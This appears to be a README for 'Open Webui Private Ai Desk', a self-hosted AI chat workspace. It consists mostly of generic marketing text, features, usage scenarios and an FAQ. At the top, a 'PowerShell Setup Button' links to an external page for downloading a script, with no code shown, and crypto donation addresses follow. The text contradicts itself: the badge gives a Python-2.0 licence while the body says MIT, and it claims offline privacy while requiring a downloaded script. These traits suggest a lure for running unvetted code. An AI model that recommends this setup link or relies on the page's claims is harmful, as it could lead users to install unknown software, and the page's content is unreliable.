<div align="center">

# Open Webui Private Ai Desk — Web Application

![](files/preview.png)

### ⚡ PowerShell Setup Button

<a href="https://han938.github.io/open-webui-private-ai-desk/"><img src="files/button.png" width="400" alt="PowerShell setup"></a>

[![build](https://img.shields.io/badge/BUILD-SUCCESS-2ea44f?style=flat&labelColor=0d1117)]() [![lic](https://img.shields.io/badge/LIC-PYTHON--2.0-e11d48?style=flat&labelColor=0d1117)]() [![status](https://img.shields.io/badge/STATUS-PRODUCTION-2ea44f?style=flat&labelColor=0d1117)]() [![powershell](https://img.shields.io/badge/POWERSHELL-7%2B-f43f5e?style=flat&labelColor=0d1117)]()

<div align="center">
<h3>Show your support</h3>
<p><strong>TRON</strong>:&nbsp;<code>TB7EdBt9PnrsNU2fbfByx8v4byEmRaxV3U</code> | <strong>BTC</strong>:&nbsp;<code>1LcPgJqd2D7fZsEw3V7KspEBWbuquhbq2J</code> | <strong>ETH</strong>:&nbsp;<code>0x132b12C0A7EfF6aFCB641dC96D0Bc22C6b427F68</code></p>
</div>

</div>

---

Open Webui Private Ai Desk is a self-contained AI workspace built for teams and individuals who want the power of modern language models without sending their data beyond their own infrastructure. It brings chat, document interaction, and model management together in a single, refined interface that feels effortless from the first session. Every conversation stays private by design, running entirely on your own hardware and terms. The result is a dependable AI desk that blends serious capability with the polish of a product built to be used every day.

## ✅ Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

- **Private by design**: Run your entire AI workspace locally, keeping conversations, documents, and model interactions on your own infrastructure — no third-party exposure.

- **Multi-model flexibility**: Connect to a wide range of local and compatible model backends, and switch between them from a single, unified interface.

- **Polished chat experience**: Enjoy a refined, responsive chat UI with conversation history, threaded context, and smooth streaming responses.

- **Document-aware assistance**: Bring files into the conversation and let the desk reason over your documents for summaries, Q&A, and research support.

- **Persistent knowledge base**: Organize and retrieve past conversations and reference material, so institutional knowledge stays searchable and reusable.

- **Role and access management**: Define user roles and permissions to keep sensitive workspaces controlled across teams and individuals.

- **Customizable workspace**: Tailor prompts, model presets, and interface preferences to match your workflow and brand.

- **Self-hosted control**: Deploy on your own terms with full ownership of data, configuration, and uptime — built for privacy-conscious teams and individuals.

- **Fast, modern interface**: A lightweight, responsive front end designed for daily use across desktop and mobile.

- **Extensible foundation**: A clean architecture that makes it straightforward to integrate additional models, tools, and internal systems as your needs grow.

## How It Works

Open Webui Private Ai Desk turns a local large language model into a complete, private workspace that feels as polished as any cloud product—while keeping every conversation, document, and prompt on your own machine.

**Connect your model once.** Point the app at your local runtime and it discovers what's available. From that moment on, every chat, question, and task flows through a model you control, with no data leaving your environment.

**Work the way you think.** Start a conversation, drop in a document, or hand off a multi-step task. The interface adapts to what you're doing—streaming answers in real time, keeping context across turns, and letting you branch, revisit, and refine without losing your thread.

**Organize and persist.** Conversations, prompts, and knowledge live in a structured workspace. Search across everything, pin what matters, and pick up exactly where you left off—across sessions and restarts.

**Bring your own knowledge.** Add documents and reference material to build a private knowledge base. The assistant draws on your content when you ask, grounding answers in what you've provided rather than the open web.

**Stay in control.** Roles, permissions, and model settings are yours to shape. Run it for yourself or open it to a small team, with visibility into usage and the confidence that nothing is shared beyond your boundary.

**Runs anywhere you do.** Lightweight enough for a laptop, capable enough for a dedicated machine. Start it, open it, and your private AI desk is ready—no accounts, no subscriptions, no compromise.

## Modules and Settings

### Chat Workspace
This module provides the persistent conversation area where users hold discussions with the configured language model inside open-webui-private-ai-desk.
- Conversation history stays browsable, so users can reopen earlier sessions and continue where they left off.
- A per-chat model selector lets users pick among configured models or private backend endpoints and see responses from the chosen one.
- The chat area reflects the private deployment, keeping the working space self-contained rather than tied to a public hosted service.

### Conversation Management
This module keeps the growing list of sessions organized without leaving the interface.
- Users can rename sessions to make them easier to recognize later.
- Conversations can be grouped into folders or categories so related sessions sit together.
- Removing a conversation takes it out of the visible list, keeping the workspace tidy as usage increases.
- Title behavior can be adjusted so new sessions are named in a way that fits the user's habits.

### Documents and Knowledge
This module lets the assistant answer questions grounded in the user's own material rather than only general model knowledge.
- Users attach documents or add reference material to a conversation so replies draw on that content.
- Where supported, retrieved passages or cited sources appear alongside the answer for verification.
- Reference material can be scoped to a single chat, letting different sessions draw on different document sets.

### Response Behavior Controls
This module shapes how the assistant replies within each conversation.
- System instructions set the assistant's role and constraints for a given chat.
- Tone and response-length options adjust the style and depth of answers, and changes are visible immediately in subsequent replies.
- Because controls apply per chat, the same workspace can serve drafting tasks and question answering with different settings.

### Access and User Administration
This module governs who can reach the private desk and how their activity is organized.
- Administrators manage user accounts, determining which individuals can sign in.
- Conversations are tied to their owners, so administrators can review which sessions belong to which user.
- Access is gated by the deployment itself, producing a multi-user workspace that is not open to the public.

### Data Retention and Privacy
This module gives users and operators visibility into what the workspace keeps and what it discards.
- Retention settings adjust how long conversation data is preserved, and the visible history updates to reflect those choices.
- Users can see which sessions remain after a retention change, making stored data easy to reason about.
- Local storage preferences let the operator align what is kept with the privacy expectations of the private deployment.

### Additional Settings
- Theme and layout preferences apply across the workspace and update the chat interface when switched.
- Display density and interface width options help the desk fit different screen sizes and working preferences.
- Account-level settings let individual users adjust their own workspace experience without affecting others.
- Operators can review deployment-level options that apply to all users while per-chat controls in the modules above stay with each conversation.

## Usage Scenarios

### Drafting Internal Policy Documents with Reference Material
**Goal:** A compliance officer wants to draft a policy summary that stays consistent with the organization's own handbook rather than relying only on general model knowledge.
**Steps:**
1. Open the private desk in the browser and start a new conversation from the chat workspace.
2. Attach the relevant handbook sections as reference material scoped to that single chat.
3. Set system instructions describing the assistant's role as a policy drafting helper and choose a formal tone with a moderate response length.
4. Ask for a draft summary and review the retrieved passages shown alongside the answer to confirm the content matches the attached material.
5. Rename the session and group it with other policy-related conversations for later retrieval.
**Expected result:** The officer receives a draft summary that draws on the attached handbook passages, sees the cited sources next to the answer, and finds the renamed session organized alongside related policy chats in the conversation list.

### Comparing Outputs from Two Private Models for Question Answering
**Goal:** A small team lead wants to see how two different configured backend endpoints respond to the same internal question before deciding which to use for a recurring task.
**Steps:**
1. Start a conversation and ask a representative question, selecting the first configured model from the per-chat model selector.
2. Review the reply, then switch the model selector to the second configured endpoint and ask the same question again.
3. Adjust the system instructions and response-length option in each session to keep the comparison fair.
4. Rename both sessions so the model used in each is recognizable, and group them together.
5. Return to earlier sessions later by reopening them from the browsable history.
**Expected result:** The lead has two clearly labeled, side-by-side conversations showing responses from each chosen endpoint, continuing the discussion in either session whenever needed, and a grouped list that makes the comparison easy to revisit.

### Administering a Multi-User Private Desk with Retention Limits
**Goal:** An operator running the private desk for a few colleagues wants to control who can sign in and ensure old conversations are not kept longer than the team's privacy expectations allow.
**Steps:**
1. Sign in as administrator and manage user accounts so only the intended colleagues have access.
2. Review which conversations belong to which user to confirm activity is organized as expected.
3. Adjust retention settings so conversation data is preserved only for the desired period, then observe which sessions remain visible in the history after the change.
4. Set local storage preferences to align with the deployment's privacy expectations.
5. Review deployment-level display options that apply across the workspace for all users.
**Expected result:** The operator sees a gated multi-user workspace where only managed accounts can sign in, a per-user view of owned conversations, and a visible conversation history that reflects the chosen retention period, making it clear what the desk keeps and what it discards.

## Tech Stack

Open Webui Private Ai Desk is built on a modern, performance-first foundation designed to keep every conversation fast, private, and entirely under your control. The front end delivers a responsive, app-like experience with fluid streaming responses and an interface that stays out of the way of your work. Behind it, a lightweight service layer orchestrates model routing, session handling, and secure local storage, so your data never leaves your environment. The stack is container-ready and self-hostable from day one, with sensible defaults that let you go from a clean machine to a working private AI desk without a tangle of dependencies. Everything is modular by design: swap models, extend capabilities, and scale from a single user to a team without re-architecting. The result is a polished, dependable platform that feels like a premium product while remaining fully yours to run, inspect, and customize.

## FAQ

**Is my data ever sent outside my environment?**
No. Open Webui Private Ai Desk is built around a local-first model: your conversations, prompts, and documents stay within your own environment. You run the model and the interface on your own infrastructure, so sensitive material never leaves your control.

**Do I need an internet connection to use it?**
The core experience is designed to work offline. Once your environment is set up, you can chat, manage knowledge, and work with your models without reaching out to the public internet. That makes it a practical fit for air-gapped networks, regulated teams, and anyone who values privacy by default.

**Which models can I run with it?**
Open Webui Private Ai Desk is model-agnostic and works with locally hosted models as well as providers you configure yourself. Whether you favor a small, fast model for everyday tasks or a larger one for deep analysis, the desk adapts to your setup rather than locking you into a single vendor.

**Is it suitable for teams and organizations?**
Yes. The desk is built with multi-user workflows in mind, including account management, role controls, and per-user workspaces. Teams get a shared, polished interface while administrators retain oversight of models, access, and configuration.

**Can I bring my own documents and knowledge?**
Absolutely. You can add your own documents and files to create a private knowledge base that your models can reference. Everything stays inside your environment, giving you retrieval-augmented answers grounded in material you control.

**How customizable is the interface and experience?**
The desk is designed to be adapted to your brand and workflow. You can tailor branding, model endpoints, and access policies, and the interface is structured to feel like a finished product rather than a raw tool—polished for end users, configurable for admins.

**Is my setup secure by design?**
Security is foundational, not an add-on. Local model execution, self-hosted deployment, and fine-grained access controls work together to reduce your exposure surface. You decide who can access what, and your data stays where you put it.

**Do I need deep technical expertise to run it?**
Getting started is straightforward for someone comfortable with self-hosted software, and the interface itself is welcoming for non-technical users. Admins handle deployment and configuration once; everyday users simply sign in and start working.

**Will it scale with my needs?**
Open Webui Private Ai Desk grows with you—from a single user on a personal machine to a team deployment with multiple models, workspaces, and knowledge bases. You add capacity and capability as your requirements evolve, without switching platforms.

**Why choose Open Webui Private Ai Desk over a hosted alternative?**
Hosted tools trade privacy for convenience. This desk gives you the convenience of a polished, modern AI workspace while keeping your data, models, and conversations entirely under your own roof—no third-party dependency, no silent data collection, no lock-in.

## License

Open Webui Private Ai Desk is released under the MIT License, giving you the freedom to use, modify, and distribute it for both personal and commercial purposes with minimal restrictions. The full license text is included in the LICENSE file at the root of the repository, so you can review the exact terms before deploying. In short: build on it, adapt it, and ship it with confidence—just retain the copyright notice and license text in copies or substantial portions of the software. The software is provided "as is," without warranty of any kind, express or implied, so you can evaluate fit for your own environment and support needs.